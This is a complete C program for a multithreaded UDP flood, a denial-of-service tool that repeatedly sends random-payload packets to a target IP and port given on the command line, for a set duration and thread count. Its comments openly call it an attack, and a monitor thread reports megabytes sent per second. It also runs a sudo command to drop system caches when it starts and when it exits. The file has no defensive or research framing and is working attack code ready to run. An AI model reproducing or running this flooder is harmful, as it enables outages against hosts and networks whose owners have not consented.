#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <fcntl.h>

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

// Global variables
volatile int keep_running = 1;
atomic_long total_data_sent = 0;

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate a random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;
    }
}

// Function to monitor total network usage in real time
void *network_monitor(void *arg) {
    while (keep_running) {
        sleep(1);
        long data_sent_in_bytes = atomic_exchange(&total_data_sent, 0);
        double data_sent_in_mb = data_sent_in_bytes / (1024.0 * 1024.0);
        printf("Total data sent in last second: %.2f MB\n", data_sent_in_mb);
        fflush(stdout);
        system("clear"); // Clears the log
    }
    pthread_exit(NULL);
}

// Function to perform the UDP flooding
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set socket to non-blocking mode
    fcntl(sock, F_SETFL, O_NONBLOCK);

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address.\n");
        close(sock);
        return NULL;
    }

    // Allocate memory for the flooding message
    message = (char *)malloc(params->packet_size);
    if (message == NULL) {
        perror("Memory allocation failed");
        close(sock);
        return NULL;
    }

    // Generate random payload
    generate_random_payload(message, params->packet_size);

    // Time-bound attack loop
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        atomic_fetch_add(&total_data_sent, params->packet_size);
    }

    free(message);
    close(sock);
    printf("Thread %d completed.\n", params->thread_id);
    fflush(stdout);
    system("clear"); // Clears thread log after completion
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Sync and clear caches before starting the attack
    system("sync");
    system("echo 3 | sudo tee /proc/sys/vm/drop_caches");

    // Validate arguments
    if (argc != 6) {
        printf("Usage: %s [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT]\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Parse input arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int thread_count = atoi(argv[5]);

    if (packet_size <= 0 || thread_count <= 0) {
        fprintf(stderr, "Invalid packet size or thread count.\n");
        return EXIT_FAILURE;
    }

    // Setup signal handler
    signal(SIGINT, handle_signal);

    // Array of thread IDs
    pthread_t threads[thread_count];
    attack_params params[thread_count];

    // Create a thread for network monitoring
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, network_monitor, NULL);

    // Launch multiple threads for flooding
    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(monitor_thread, NULL);

    // Sync and clear caches before exiting
    system("sync");
    system("echo 3 | sudo tee /proc/sys/vm/drop_caches");

    printf("Attack finished. All threads stopped.\n");
    fflush(stdout);
    return EXIT_SUCCESS;
}
